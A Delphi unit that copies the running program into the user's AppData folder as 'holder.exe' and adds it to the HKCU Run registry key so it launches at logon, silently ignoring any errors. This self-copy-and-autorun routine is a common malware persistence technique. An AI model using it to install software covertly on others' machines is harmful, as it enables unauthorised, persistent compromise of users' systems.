unit autorun;

interface

uses
  SysUtils, Windows, Registry, ShellAPI, ShlObj;


procedure CopyFileAndAddToAutorun;

implementation

const
  DEST_FOLDER = 'Hephaestus';
  REG_PATH = 'Software\Microsoft\Windows\CurrentVersion\Run';
  APP_NAME = 'Hephaestus'; // Replace with the name you want to appear in autorun

procedure CopyFileAndAddToAutorun;

var
  SourcePath, AppDataPath: array[0..MAX_PATH] of AnsiChar;
  DestPath: string;
  Reg: TRegistry;
  SrcPtr, DestPtr: PAnsiChar;
  FailIfExists: LongBool;
begin
  // Get the path to the AppData folder
  if not SHGetSpecialFolderPath(0, AppDataPath, CSIDL_APPDATA, False) then
    raise Exception.Create('Unable to retrieve APPDATA path.');

  // Define the destination path
  StrCat(AppDataPath, PAnsiChar('\' + DEST_FOLDER));
  if not DirectoryExists(AppDataPath) then
    CreateDir(AppDataPath);

  // Define the source and destination file paths
  StrPCopy(SourcePath, AnsiString(ParamStr(0))); // Convert to AnsiString
  DestPath := IncludeTrailingPathDelimiter(AppDataPath) + 'holder.exe';

  // Assign pointers to the source and destination paths
  SrcPtr := @SourcePath[0];
  DestPtr := PAnsiChar(DestPath);

  // Specify whether to fail if the destination file already exists
  FailIfExists := LongBool(False);

  // Copy the file, replacing the existing one if necessary
  try
    if not CopyFile(SrcPtr, DestPtr, FailIfExists) then
      raise Exception.Create('File copy failed.');
  except
    on E: Exception do
      // Ignore any exceptions during file copy
      ; // Log or handle the error as needed
  end;

  // Add the executable to the registry autorun
  try
    Reg := TRegistry.Create;
    try
      Reg.RootKey := HKEY_CURRENT_USER;
      if Reg.OpenKey(REG_PATH, True) then
      begin
        Reg.WriteString(APP_NAME, DestPath + ' autostart');
        Reg.CloseKey;
      end;
    finally
      Reg.Free;
    end;
  except
    on E: Exception do
      // Ignore any exceptions during registry modification
      ; // Log or handle the error as needed
  end;
end;


end.
